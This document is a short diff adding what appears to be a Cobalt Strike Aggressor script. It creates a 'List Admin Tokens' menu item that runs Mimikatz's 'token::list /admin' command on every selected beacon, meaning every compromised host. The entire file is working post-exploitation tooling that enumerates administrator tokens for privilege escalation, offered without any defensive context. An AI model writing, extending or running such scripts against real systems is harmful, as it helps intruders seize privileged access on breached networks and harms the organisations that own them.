@@ -1,0 +1,12 @@
+#List Admin Tokens
+item "List Admin Tokens"{
+	local('$bid');
+		foreach $bid ($1){
+			listadmintokens($bid);
+		}			
+	}
+
+# Mimikatz List Admin Tokens
+sub listadmintokens{
+bmimikatz($1, "token::list /admin");
+}
